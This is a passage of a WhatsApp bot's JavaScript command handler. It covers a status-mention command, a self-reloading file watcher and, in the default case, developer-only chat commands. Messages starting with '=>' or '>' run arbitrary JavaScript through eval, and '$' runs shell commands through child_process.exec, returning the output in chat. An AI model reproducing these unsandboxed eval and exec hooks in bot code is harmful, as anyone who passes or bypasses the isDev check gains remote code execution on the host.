    let jidText = text.slice(index + 1);
    let jids = jidText.split('|').filter(Boolean);
    let statusText = text.slice(0, index).trim();
    content.text = statusText;
    if (jids.length === 0) return m.reply("Please provide at least one JID");
    mentionStatus(jids, content).catch(console.error);
    return;
  } else {
    return m.reply(`Reply Media or enter the format: \n${global.prefix} status <text> | <jid1>|<jid2>|...`);
  }
  let jids = m.text.split(' ').slice(1).join(' ').split('|');
  jids = jids.filter(Boolean); 
  if (jids.length === 0) return m.reply("Please provide at least one JID");
  mentionStatus(jids, content).catch(console.error);
} 
break;
//================================================================================



default:

if (budy.startsWith('=>')) {
            if (!isDev) return;
            function Return(sul) {
                sat = JSON.stringify(sul, null, 2);
                bang = util.format(sat);
                if (sat == undefined) {
                    bang = util.format(sul);
                }
                return m.reply(bang);
            }
            try {
                m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)));
            } catch (e) {
                m.reply(String(e));
     }
}
   
        
if (budy.startsWith('$')) {
            if (!isDev) return;
            require("child_process").exec(budy.slice(2), (err, stdout) => {
            if (err) return m.reply(`${err}`);
            if (stdout) return m.reply(stdout);
      });
}             
                       
        
if (budy.startsWith('>')) {
if (!isDev) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}


}} catch (err) {
console.log(err)
/*let e = String(err)
donwiz.sendMessage(`${owner}@s.whatsapp.net`, { text: e, 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
*/
}

}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})
               
process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})